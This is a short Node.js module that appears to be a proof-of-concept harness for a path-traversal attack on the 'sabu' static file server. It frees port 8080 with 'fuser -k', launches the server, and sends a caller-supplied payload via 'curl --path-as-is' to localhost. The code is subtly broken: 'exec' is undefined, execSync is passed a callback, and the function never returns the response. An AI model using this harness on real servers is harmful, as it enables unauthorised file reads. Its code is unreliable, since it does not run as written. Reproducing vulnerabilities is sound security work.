const path = require("path"); // Import the path module
const { sleep } = require("sleep");

function exploitFunction(payload) {
  const { execSync } = require("child_process");
  execSync("fuser -k 8080/tcp", () => {});

  const server = "node ./node_modules/sabu/bin/sabu";
  exec(server, (error, stdout) => {
    sleep.sleep(2);

    const attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${payload}"`;
    exec(attack_string, (error, stdout) => {
      return stdout;
    });
  });
}

module.exports = { exploitFunction };